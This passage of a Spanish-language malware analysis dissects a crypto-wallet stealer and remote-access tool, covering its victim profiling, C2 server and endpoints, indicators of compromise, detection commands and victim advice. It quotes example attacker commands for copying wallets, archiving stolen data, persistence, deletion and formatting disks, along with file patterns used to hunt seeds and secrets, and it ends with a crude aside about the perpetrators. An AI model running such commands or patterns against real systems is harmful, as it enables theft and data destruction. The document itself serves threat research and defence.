  - 22 wallets diferentes detectadas por extensiones
  - Wallets de escritorio: Exodus, Solana
  - Historial de transacciones en wallets

3. Perfil financiero, indicadores de "riqueza" cripto:

- Cantidad de wallets instaladas
- Tipos de wallets (DeFi, NFT, exchanges)
- Archivos de backup/recuperación
- Documentos financieros:

```javascript
searchKey = [
  "*credential*",
  "*account*",
  "*profile*",
  "*.pdf",
  "*.doc",
  "*.docx", // Pueden contener info bancaria
];
```

4. Perfil de seguridad, medidas de seguridad implementadas

- Uso de VM (indica usuario técnico/precavido)
- Tipos de wallets (hardware vs software)
- Archivos de backup organizados
- Patrones de trabajo:
  - Monitoreo de portapapeles cada 500ms
  - Detecta si copia direcciones, seeds, passwords

5. Perfil geográfico/temporal

- Zona horaria y actividad
- Timestamp de infección
- Patrones de uso del portapapeles
- Horarios de actividad

6. Perfil de valor como víctima

- Clasificación automática:
- Alto valor: Hardware físico + múltiples wallets + documentos financieros
- Valor medio: VM con algunas wallets
- Bajo valor: VM sin wallets detectadas
- Targeting específico, el servidor puede decidir qué payloads enviar basado en:
  - Tipo de entorno (VM vs físico)
  - Wallets detectadas
  - Nivel técnico aparente

7. Inteligencia operacional, para el atacante, este perfilado permite:

- Priorizar víctimas (físico > VM)
- Personalizar ataques (developer vs usuario casual)
- Evaluar riesgo (entorno técnico vs doméstico)
- Optimizar payloads (qué robar primero)
- Evitar detección (comportarse diferente en VMs)

8. Perfil de red/infraestructura

- Información de conectividad
- Capacidad de recibir comandos remotos
- Estabilidad de conexión (15 reintentos, delay de 2seg)

---

## 🌐 INFRAESTRUCTURA DEL ATACANTE

Con toda la información recolectada de la víctima, el malware se comunica constantemente con una infraestructura criminal bien organizada. Analicemos esta red en detalle.

### Sistema de Comando y Control

El atacante tiene comunicación bidireccional completa vía socket.io:

```javascript
// EL ATACANTE PUEDE ENVIAR:
socket.on("command", ...)     // Comandos de sistema
socket.on("whour", ...)       // Solicitud de información

// LA VÍCTIMA ENVÍA AUTOMÁTICAMENTE:
socket.emit("message", ...)   // Resultados de comandos
socket.emit("whoIm", ...)     // Información del sistema
makeLog(content)              // Contenido del portapapeles
```

¿Qué podría hacer el atacante?

```javascript
# Listar procesos
tasklist                    # Windows
ps aux                      # Linux/Mac

# Ver archivos
dir C:\Users\%USERNAME%     # Windows
ls -la ~/                   # Linux/Mac

# Información de red
ipconfig /all               # Windows
ifconfig                    # Linux/Mac
```

¿Algunos ejemplos?

Comandos de robo:

```javascript
# Copiar wallets
copy "C:\Users\%USERNAME%\AppData\Roaming\Exodus\*" D:\temp\
cp -r ~/.config/Exodus/ /tmp/

# Comprimir datos
tar -czf stolen.tar.gz ~/.config/
```

Comandos de persistencia:

```javascript
# Crear tareas programadas
schtasks /create /tn "Update" /tr "node malware.js" /sc minute
crontab -e  # Agregar cron job

# Modificar registro (Windows)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
```

Comandos de destrucción masiva:

```javascript
# Borrar evidencia
del /f /s /q C:\temp\stolen\*
rm -rf /tmp/stolen/

# Formatear discos (extremo) 🥴
format C: /q
```

---

### Datos Recolectados y Exfiltrados

Inventario completo de toda la información que el malware puede robar de la víctima.

#### 🌐 Credenciales de Navegador:

- `Login Data` (contraseñas guardadas)
- `Local State` (configuraciones y tokens)
- Perfiles de usuario de Chrome, Brave, Opera, Firefox, Edge

#### 🦊 Datos de Wallets:

- Archivos `.log` y `.ldb` de extensiones
- Seeds y frases de recuperación
- Configuraciones de wallet Exodus
- MacOS Keychain (`login.keychain`)
- Archivos de Solana (`~/.config/solana/id.json`)

#### 🔍 Archivos Específicos Buscados:

```javascript
const searchKey = [
  "*.env*",
  "*metamask*",
  "*phantom*",
  "*bitcoin*",
  "*phrase*",
  "*secret*",
  "*mnemonic*",
  "*seed*",
  "*recovery*",
  "*backup*",
  "*wallet*",
  "*.json",
  "*.txt",
  "*.pdf",
  "*.doc",
  "*.csv",
];
```

#### 🎯 Perfilado multidimensional:

El malware crea un perfil multidimensional que incluye:

- Valor financiero (wallets, documentos)
- Nivel técnico (developer vs usuario casual)
- Perfil de seguridad (uso de VM, medidas preventivas)
- Potencial de monetización (activos cripto, documentos)
- Patrones de comportamiento (actividad, horarios)

Esta información es de valor extremadamente alto porque el atacante puede priorizar y personalizar ataques en aquellos candidatos que representen una buena combinación de estos aspectos.

Lo que el atacante puede hacer:

- 👊 Ejecutar cualquier comando como si estuvieran sentados frente a tu PC
- 👊 Ver todo lo que copiás (direcciones cripto, passwords, etc.)
- 👊 Descargar archivos de tu sistema
- 👊 Instalar más malware
- 👊 Usar tu PC como proxy/botnet
- 👊 Espiar tu actividad en tiempo real
- 👊 Formatear tu disco duro si se les ocurre
- 👊 Robar credenciales de cualquier aplicación
- 👊 Acceder a cámaras/micrófonos con comandos

---

### Pero, quién es este bastardo?

#### 🌐 Servidores Identificados:

- C&C Principal: `144.172.105.189:4661`
- Servidor de Upload: `144.172.105.189:4666`
- Servidor de Archivos: `144.172.105.189:1224`
- URL Ofuscada: `https://bs-production.up.railway.app/on`

#### 🔗 Endpoints Maliciosos:

```http
POST http://144.172.105.189:1224/uploads
POST http://144.172.105.189/api/service/makelog
POST http://144.172.105.189/api/service/process/
GET  http://144.172.105.189:1224/client/106/212
GET  http://144.172.105.189:1224/pdown
```

Un `whois` rápido indica lo siguiente:

```text
IP address     144.172.105.189
ISP	           FranTech Solutions
Usage Type     Data Center/Web Hosting/Transit
ASN	           Unknown
Domain Name	   frantech.ca
Country        🇺🇸 United States of America
City           Ogden, Utah
```

Un análisis de virustotal.com revela:

![Image](https://gist.github.com/raiseerco/37f8abf7feb71663c95390d36c2e5513/raw/7163dba2da784c109ac305b8616f6a4177633e05/6.png)

Un análisis vía Shodan.io da una idea de los puertos abiertos (puede variar según horario):

https://www.shodan.io/host/144.172.105.189

### Indicadores de Compromiso (IOCs)

#### 🌐 Direcciones IP:

```
144.172.105.189 (Servidor C&C)
```

#### 📁 Archivos y Rutas:

```
~/.n3/          (Directorio temporal)
~/.npl          (Payload de Python)
~/AppData/Roaming/Exodus/exodus.wallet
~/.config/solana/id.json
```

#### 🔍 Patrones de Comportamiento:

- Instalación silenciosa de `socket.io-client`
- Creación del directorio `~/.n3`
- Conexiones al puerto 4661
- Ejecución de comandos con `windowsHide: true`

Ahora que tenemos un entendimiento detallado de las capacidades del malware y su infraestructura, es momento de analizar cómo defenderse efectivamente contra esta amenaza.

<br/>

---

## 🛡️ DETECCIÓN Y CONTRAMEDIDAS

<br/>

> ### 🔍 _"Do not trust, verify!"_

<br/>

### Para Desarrolladores

| Medida                     | Descripción                                                | Efectividad  |
| -------------------------- | ---------------------------------------------------------- | ------------ |
| Verificación de Origen     | Solo descargar de repositorios oficiales/confiables        | 🟢 **Alta**  |
| Sandboxing                 | Ejecutar código desconocido en entornos aislados           | 🟢 **Alta**  |
| Monitoreo de Red Maliciosa | Bloquear conexiones a IPs sospechosas                      | 🟡 **Media** |
| Auditoría de Código        | Revisar todo antes de ejecutar (y usar herramientas de IA) | 🟢 **Alta**  |

<br/>

### Para Usuarios de Cripto

| Medida           | Descripción                                       | Efectividad    |
| ---------------- | ------------------------------------------------- | -------------- |
| Wallets Hardware | Usar dispositivos físicos para fondos importantes | 🟢 **Crítica** |
| Segregación      | Wallets separadas para trading y holding          | 🟢 **Alta**    |
| Verificación     | Confirmar URLs oficiales y extensiones            | 🟡 **Media**   |
| Actualizaciones  | Mantener navegadores y extensiones actualizados   | 🟡 **Media**   |

<br/>

### Detección

Aunque hay muchas otras herramientas avanzadas de desarrolladores de 3ros, voy a mostrar algunos métodos básicos de detección, usando comandos de shell estándar.

```bash
# Monitorear conexiones sospechosas
netstat -an | grep 144.172.105.189

# Verificar procesos sospechosos de Node.js
ps aux | grep node | grep socket.io

# Buscar archivos temporales maliciosos
find ~ -name ".n3" -type d
find ~ -name ".npl" -type f

# Chequear puertos específicos del malware
ss -tuln | grep -E ':(4661|4666|1224)'
```

### Vectores de Ataque

#### 🎭 Ingeniería Social:

1. Ofertas de trabajo falsas en Web3/Blockchain
2. "Proyectos demo" para entrevistas técnicas
3. Repositorios falsos con código aparentemente legítimo
4. Solicitudes de "revisión de código"
5. Envío de actualizaciones de software falsas (ej., parches para Zoom)

#### 🥷 Técnicas de Evasión:

1. Ofuscación extrema de código
2. Ejecución en segundo plano (`windowsHide: true`)
3. Instalación silenciosa de dependencias
4. Múltiples capas de abstracción
5. Anti-debugging integrado

<br/>

> 🚨 **Si sospechás que fuiste víctima de este ataque, cada segundo cuenta. Seguí estas recomendaciones inmediatamente.**

<br/>

---

## ⚡ RECOMENDACIONES URGENTES

### Si ya fuiste víctima:

#### Acción Inmediata:

1. Desconectar internet inmediatamente
2. Transferir fondos a nuevas wallets desde otro dispositivo
3. Cambiar todas las contraseñas desde un dispositivo limpio
4. Formatear completamente el sistema
5. Reportar el incidente a las autoridades

#### Investigación:

```bash
# Verificar conexiones activas
netstat -an | grep 144.172.105.189

# Buscar procesos maliciosos
ps aux | grep -E "(socket.io|\.npl)"

# Verificar archivos comprometidos
find ~ -name "*.n3" -o -name ".npl"
```

### Prevención a Futuro:

#### Checklist de Seguridad:

- [ ] Hardware wallet para fondos principales
- [ ] Navegador dedicado solo para cripto
- [ ] 2FA habilitado en todas las cuentas
- [ ] Antivirus actualizado con protección en tiempo real
- [ ] Firewall configurado para bloquear IPs sospechosas
- [ ] Backup físico de seeds en lugar seguro

<br/>

🏁
Llegamos al final de la investigación. Es momento de reflexionar sobre las implicaciones de esta amenaza y las tendencias futuras en ciberseguridad.

<br/>

---

## 📝 CONCLUSIONES

### Sofisticación del Ataque

Este malware representa un **stealer extremadamente sofisticado e integral**, que combina múltiples capacidades avanzadas:

| Capacidad          | Nivel                  |                                      |
| ------------------ | ---------------------- | ------------------------------------ |
| Vectores de Ataque | 🔴 **Múltiples**       | Ingeniería social + código malicioso |
| Capacidades RAT    | 💀 **Completas**       | Control remoto total del sistema     |
| Evasión            | 🟡 **Avanzada**        | Anti-análisis + detección de VM      |
| Persistencia       | 🔴 **Multiplataforma** | Windows, macOS, Linux                |
| Exfiltración       | 💀 **Masiva**          | 22+ wallets + credenciales completas |
| Perfilado          | 🟡 **Integral**        | Análisis completo de víctima         |

### Proyecciones a Futuro

Creo que vamos a ver más variantes de este tipo de malware dirigido específicamente a profesionales del ecosistema blockchain, usando vectores de ingeniería social cada vez más sofisticados combinados con herramientas de IA que van a hacer vulnerables a muchos usuarios y plataformas.

### Profesionales en Riesgo

| Perfil                     | Riesgo         | Impacto Potencial              |
| -------------------------- | -------------- | ------------------------------ |
| Usuarios Web3              | 💀 **CRÍTICO** | Pérdida total de fondos        |
| Desarrolladores Blockchain | 🔴 **ALTO**    | Acceso a repositorios + fondos |
| Traders/Inversores         | 💀 **CRÍTICO** | Pérdida masiva de portafolio   |
| Empleados Cripto           | 🔴 **ALTO**    | Acceso corporativo + personal  |

### Sobre los Perpetradores

Parece poco probable que esto haya sido obra de un gordo en un sótano, o un adolescente tratando de impresionar a sus amigos.
Podría ser un adolescente gordo de NK o país similar. Es evidente que invirtieron largas horas de desarrollo y testing para llevar a cabo crímenes de no poca magnitud.

---

# Mantené tus datos seguros,<br/> nadie lo va a hacer por vos.

<br/>

```
⚖️ Disclaimer Legal

Este análisis es proporcionado solo con fines educativos y de prevención.

❌ NO ejecutes el código malicioso analizado
❌ NO distribuyas ningún componente del malware
✅ SÍ compartí este análisis para prevenir potenciales víctimas

**El autor no se hace responsable del mal uso de esta información.**

```

---

<br/>
Stay safuuuuu 👋
<br/>
<br/>
<br/>
